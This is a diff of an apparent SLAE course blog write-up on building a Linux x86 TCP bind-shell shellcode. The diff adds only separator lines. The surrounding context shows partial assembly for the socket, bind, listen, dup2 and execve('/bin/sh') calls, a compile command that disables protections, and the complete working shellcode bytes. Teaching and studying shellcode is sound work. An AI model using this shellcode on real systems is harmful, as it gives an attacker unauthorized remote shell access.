@@ -77,7 +77,7 @@ root
 <p style="text-align: justify;">They are responsible for the whole process that the computer must perform to finally end with an open port waiting for connection.</p>
 
 <p style="text-align: justify;">So let's start creating our shellcode using NASM. I will try to divide this process into parts, distinguishing between different system calls called in the course.</p>
-
+------------------------------------------------------------------------------------------------
 ### Clearing ###
 <p style="text-align: justify;">First, we will start by clearing the registers we use, because in the case of the C language wrapper that we will be using, it may turn out to be very important (registers are not empty at the time of transition to the _start function).</p>
 
@@ -94,7 +94,7 @@ cleaning:
 	xor ecx, ecx
 	xor edx, edx
 ```
-
+------------------------------------------------------------------------------------------------
 ### sys_socket() ###
 <p style="text-align: justify;">Then, we proceed to create the socket. For this purpose, we will use socketcall() syscall, which will allow us to easily call subsequent types of system calls (socket, bind, listen ....). At this point I would like to explain the principle of system calls. Their list, in the case of systems based on intel x86 processors, can be found in the file:</p>
 
@@ -202,7 +202,7 @@ sys_socket:
 
 	mov edx, eax		; saving the bind_socket pointer for further usage
 ```
-
+------------------------------------------------------------------------------------------------
 ### sys_bind() ###
 <p style="text-align: justify;">The next call system will be sys_bind. The whole process looks very similar, except that we have here "throwing" arguments to the stack and indicating their top to the ECX register twice.</p>
 
@@ -247,7 +247,7 @@ sys_bind:
 	int 128			; syscall execution
 ```
 
-
+------------------------------------------------------------------------------------------------
 ### sys_listen() ###
 Next in order - sys_listen()
 
@@ -279,7 +279,7 @@ sys_listen:
 	
 	int 128			; syscall execution
 ```
-
+------------------------------------------------------------------------------------------------
 ### sys_accept() ###
 Another simple syscall is sys_accept().
 
@@ -314,7 +314,7 @@ sys_accept:
 
 	mov edx, eax		; saving the bind_socket pointer for further usage
 ```
-
+------------------------------------------------------------------------------------------------
 ### sys_dup2() ###
 <p style="text-align: justify;">Another syscall, sys_dup2() can be implemented in many ways, for example by using loops. I decided to do it step by step in order to better illustrate the arguments raised. It is worth noting that it is not called from socketcall(), but directly as system syscall.</p>
 
@@ -355,7 +355,7 @@ sys_dup2:
 
 	int 128			; syscall execution
 ```
-
+------------------------------------------------------------------------------------------------
 ### sys_execve() ###
 <p style="text-align: justify;">The last syscall we call will be sys_execve. In this case we see the placement of the string "/bin/sh" + string terminator "\x00" in the EBX registry, using a stack.</p>
 
@@ -551,7 +551,7 @@ sys_execve:
 
 	int 128			; syscall execution
 ```
-
+------------------------------------------------------------------------------------------------
 ### Assemble and linking ###
 
 Let's use scripts provided by Vivec in SLAE course materials.
@@ -570,7 +570,7 @@ $ ./compile.sh bind_shell
 [+] Linking ...
 [+] Done!
 ```
-
+------------------------------------------------------------------------------------------------
 ### Preparing C Wrapper ###
 
 <p style="text-align: justify;">Now we extract the shellcode from our NASM and put it in the C language wrapper. It's also worth checking to see if any null-byte has crept in.</p>
@@ -604,7 +604,7 @@ And compile.
 ```sh
 $ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
-
+------------------------------------------------------------------------------------------------
 ### Python port wrapper ###
 
 <p style="text-align: justify;">A very nice improvement is to write a wrapper that will allow us to quickly change the port on which TCP Bind Shell should run.</p>
@@ -648,7 +648,7 @@ Port in hex:      \x1f\x90
 
 Final shellcode:  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x02\x31\xf6\x56\x66\x68\x1f\x90\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xf6\x56\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x31\xf6\x56\x56\x52\x89\xe1\xcd\x80\x89\xc2\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
 ```
-
+------------------------------------------------------------------------------------------------
 ### Execution ###
 
 ```sh
